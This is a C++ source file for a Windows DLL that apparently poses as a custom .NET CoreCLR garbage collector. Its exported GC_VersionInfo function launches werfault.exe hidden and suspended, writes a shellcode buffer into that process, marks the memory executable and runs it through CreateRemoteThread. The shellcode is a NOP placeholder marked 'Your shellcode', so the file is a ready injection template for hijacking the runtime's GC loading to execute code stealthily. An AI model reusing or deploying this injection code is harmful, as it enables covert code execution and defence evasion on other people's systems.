#pragma once
#include <Windows.h>
#include <stdint.h>
#include <stdio.h>

// From coreclr gcinterface.h
struct VersionInfo {
	uint32_t MajorVersion;
	uint32_t MinorVersion;
	uint32_t BuildVersion;
	const char* Name;
};

extern "C" __declspec(dllexport) void GC_VersionInfo(VersionInfo * info) {
	info->MajorVersion = 6;
	info->MinorVersion = 6;
	info->BuildVersion = 6;
	info->Name = "Custom GC";

	// Your shellcode
	unsigned char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\xc3";

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(STARTUPINFO);

	bool bResult = ::CreateProcess(L"C:\\Windows\\System32\\werfault.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (!bResult)
		return;
	
	LPVOID lpAddress = ::VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpAddress == NULL)
		return;

	SIZE_T NumberOfBytesWritten = 0;
	bResult = ::WriteProcessMemory(pi.hProcess, lpAddress, shellcode, sizeof(shellcode), &NumberOfBytesWritten);
	if (!bResult || NumberOfBytesWritten != sizeof(shellcode)) {
		::TerminateProcess(pi.hProcess, 0);
		return;
	}

	DWORD dwOldProtect = 0;
	bResult = ::VirtualProtectEx(pi.hProcess, lpAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);
	if (!bResult || dwOldProtect != 0x0004) {
		::TerminateProcess(pi.hProcess, 0);
		return;
	}

	DWORD dwThreadId = 0;
	::CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpAddress, NULL, 0, &dwThreadId);
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}
